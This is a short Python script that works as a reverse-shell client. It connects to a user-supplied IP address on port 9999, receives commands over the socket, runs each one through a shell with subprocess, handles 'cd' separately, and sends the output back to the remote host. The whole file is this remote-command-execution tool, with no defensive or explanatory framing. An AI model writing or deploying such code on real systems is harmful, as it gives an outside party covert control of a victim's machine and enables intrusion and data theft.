import socket
import os
import subprocess

skt = socket.socket()

host =input("Enter IP address: ")
port = 9999

print("\nConnecting to "+ str(host)+" .....")
skt.connect((host, port))

while True:
    data = skt.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_byte)

        currentWD = os.getcwd() + " >> "

        skt.send(str.encode(output_string))


